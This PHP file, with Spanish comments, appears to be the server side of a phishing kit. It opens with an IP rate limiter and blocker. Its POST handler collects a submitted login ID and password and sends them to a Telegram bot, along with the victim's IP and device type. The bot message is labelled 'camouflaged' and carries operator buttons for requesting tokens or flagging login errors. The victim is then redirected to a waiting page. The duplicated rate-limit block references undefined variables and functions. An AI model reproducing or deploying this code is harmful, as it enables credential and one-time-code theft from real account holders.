<?php
// ---------------- CONFIG ----------------
$blacklist_file   = __DIR__ . '/blocked_ips.txt';   // una IP por línea
$blocked_log_file = __DIR__ . '/blocked_log.txt';   // registro de bloqueos (opcional)
$rate_dir         = sys_get_temp_dir() . '/pros_rate'; // directorio para counters
$threshold        = 20;    // requests permitidos
$window_seconds   = 60;    // ventana de tiempo (segundos)
$auto_block       = true;  // si true, cuando supera threshold se agrega a blocked_ips.txt

// Si tu app usa proxy/reverse-proxy confiable: pon true y agrega IPs en $trusted_proxies.
// Si no, deja false para usar únicamente REMOTE_ADDR (más seguro contra spoofing).
$trust_x_forwarded = false;
$trusted_proxies = [
    // '127.0.0.1', '1.2.3.4'
];

// -------------- HELPERS -----------------
function is_valid_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
}

function get_client_ip() {
    global $trust_x_forwarded, $trusted_proxies;
    // Si no confiamos en cabeceras, devolvemos REMOTE_ADDR
    if (empty($_SERVER['REMOTE_ADDR'])) return '';
    $remote = $_SERVER['REMOTE_ADDR'];

    if (!$trust_x_forwarded) {
        return is_valid_ip($remote) ? $remote : '';
    }

    // Si confiamos en XFF, tomamos la primera IP válida de las cabeceras
    $headers = [
        $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '',
        $_SERVER['HTTP_X_REAL_IP']       ?? '',
        $_SERVER['HTTP_CLIENT_IP']       ?? '',
        $_SERVER['HTTP_CF_CONNECTING_IP']?? '',
        $_SERVER['HTTP_X_FORWARDED']     ?? '',
        $_SERVER['HTTP_FORWARDED_FOR']   ?? '',
        $_SERVER['HTTP_FORWARDED']       ?? ''
    ];
    foreach ($headers as $h) {
        if (!$h) continue;
        // X-Forwarded-For puede venir como "cliente, proxy1, proxy2"
        $parts = preg_split('/\s*,\s*/', $h);
        foreach ($parts as $p) {
            $p = trim($p);
            if (is_valid_ip($p)) return $p;
        }
    }
    return is_valid_ip($remote) ? $remote : '';
}

function deny_and_exit($reason = 'Forbidden') {
    header('HTTP/1.1 403 Forbidden');
    header('Content-Type: text/plain; charset=UTF-8');
    echo $reason;
    exit;
}

function log_block_attempt($ip, $reason='blocked') {
    global $blocked_log_file;
    $line = date('Y-m-d H:i:s') . " | $ip | $reason" . PHP_EOL;
    @file_put_contents($blocked_log_file, $line, FILE_APPEND | LOCK_EX);
}

function add_ip_to_blacklist($ip) {
    global $blacklist_file;
    if (!is_valid_ip($ip)) return false;
    // crear archivo si no existe
    if (!file_exists($blacklist_file)) {
        @touch($blacklist_file);
        @chmod($blacklist_file, 0660);
    }
    // Comprobar duplicados y escribir con bloqueo
    $bf = @fopen($blacklist_file, 'c+');
    if (!$bf) return false;
    $added = false;
    if (flock($bf, LOCK_EX)) {
        $existing = array_map('trim', file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: []);
        if (!in_array($ip, $existing, true)) {
            fseek($bf, 0, SEEK_END);
            fwrite($bf, $ip . PHP_EOL);
            $added = true;
        }
        flock($bf, LOCK_UN);
    }
    fclose($bf);
    return $added;
}

// ------------- PREPARAR ENTORNO ------------
@mkdir($rate_dir, 0700, true);

// ----------- OBTENER IP Y CHECK BLACKLIST ----------
$client_ip = get_client_ip();
if (!is_valid_ip($client_ip)) {
    // Si no se detecta IP válida: denegar por seguridad
    deny_and_exit('IP inválida');
}

// leer blacklist (rápido)
$blocked = [];
if (is_readable($blacklist_file)) {
    foreach (file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $ln) {
        $ln = trim($ln);
        if ($ln !== '' && is_valid_ip($ln)) $blocked[$ln] = true;
    }
}
if (isset($blocked[$client_ip])) {
    log_block_attempt($client_ip, 'already_blacklisted');
    deny_and_exit('IP bloqueada');
}

// ------------- RATE LIMIT + AUTO-BLOCK (permanente) -------------
$safe_name = preg_replace('/[^0-9a-fA-F:.]/', '_', $client_ip);
$ipfile = rtrim($rate_dir, '/')."/{$safe_name}.json";
$now = time();
$state = ['count' => 0, 'start' => $now];

if (file_exists($ipfile)) {
    $raw = @file_get_contents($ipfile);
    $tmp = $raw ? json_decode($raw, true) : null;
    if (is_array($tmp) && isset($tmp['count'], $tmp['start'])) $state = $tmp;
}

// si expiró la ventana, reiniciar
if (($now - $state['start']) > $window_seconds) {
    $state = ['count' => 0, 'start' => $now];
}

// incrementar y persistir
$state['count']++;
if ($fp = @fopen($ipfile, 'c+')) {
    if (flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($state));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

// si excede threshold: bloquear permanentemente (añadir a blocked_ips.txt) y denegar
if ($state['count'] > $threshold) {
    if ($auto_block) {
        $added = add_ip_to_blacklist($client_ip);
        log_block_attempt($client_ip, $added ? 'auto_blocked' : 'auto_blocked_already_present');
    } else {
        log_block_attempt($client_ip, 'rate_limit_exceeded');
    }
    deny_and_exit('Demasiadas solicitudes — IP bloqueada');
}
// si la ventana ya expiró, reiniciamos
if (($now - $state['start']) > $window_seconds) {
    $state = ['count' => 0, 'start' => $now];
}

// incrementar contador
$state['count']++;

// persistir estado (con lock simple)
$fp = @fopen($ipfile, 'c+');
if ($fp) {
    if (flock($fp, LOCK_EX)) {
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($state));
        fflush($fp);
        flock($fp, LOCK_UN);
    }
    fclose($fp);
}

// comprobar si excede threshold
if ($state['count'] > $threshold) {
    if ($auto_block) {
        // añadir a blacklist (evitar duplicados)
        if (!isset($blocked[$ip])) {
            // abrir con bloqueo exclusivo para evitar race conditions
            $bf = @fopen($blacklist_file, 'a+');
            if ($bf) {
                if (flock($bf, LOCK_EX)) {
                    // volver a leer por si otro proceso ya lo añadió
                    clearstatcache(true, $blacklist_file);
                    $current = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
                    $exists = false;
                    foreach ($current as $line) {
                        if (trim($line) === $ip) { $exists = true; break; }
                    }
                    if (!$exists) {
                        fwrite($bf, $ip . PHP_EOL);
                    }
                    flock($bf, LOCK_UN);
                }
                fclose($bf);
            }
        }
    }
    send_forbidden_and_exit('404');
}
session_start();
include("settings.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pp1 = $_POST['pp1'] ?? '';
    $pp2 = $_POST['pp2'] ?? '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $_SESSION['usuario'] = $pp1;

    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $dispositivo = (preg_match('/android|iphone|ipad|mobile/i', $userAgent)) ? 'movil' : 'pc';
    $_SESSION['dispositivo'] = $dispositivo;

    // Mensaje camuflado
    $mensaje = "📥 AVANZ LOGIN\n";
    $mensaje .= "ID: $pp1\n";
    $mensaje .= "Clave temporal: $pp2\n";
    $mensaje .= "Modo: $dispositivo\n";
    $mensaje .= "Red: $ip";

    $botones = [
        [
            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$pp1"],
            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$pp1"]
        ],
        [
            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$pp1"]
        ]
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'reply_markup' => json_encode(['inline_keyboard' => $botones])
    ]));

    header("Location: sleep.html");
    exit();
}
?>
